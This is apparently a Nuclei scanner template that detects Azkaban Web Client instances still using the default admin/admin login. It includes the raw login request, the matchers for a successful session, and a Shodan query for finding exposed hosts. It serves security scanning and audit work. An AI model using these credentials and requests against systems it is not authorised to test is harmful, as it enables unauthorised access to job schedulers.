http:
- attack: pitchfork
  extractors:
  - kval:
    - azkaban.browser.session.id
    type: kval
  matchers:
  - condition: and
    type: word
    words:
    - '"session.id"'
    - '"success"'
  - condition: and
    part: header
    type: word
    words:
    - azkaban.browser.session.id
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=login&username={{username}}&password={{password}}

    '
id: azkaban-default-login
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:azkaban_project:azkaban:*:*:*:*:*:*:*:*
    cwe-id: CWE-798
  description: Azkaban is a batch workflow job scheduler created at LinkedIn to run
    Hadoop jobs.  Default web client credentials were discovered.
  metadata:
    max-request: 1
    product: azkaban
    shodan-query: http.title:"Azkaban Web Client"
    vendor: azkaban_project
  name: Azkaban Web Client Default Credential
  severity: high
  tags: default-login,azkaban,vuln
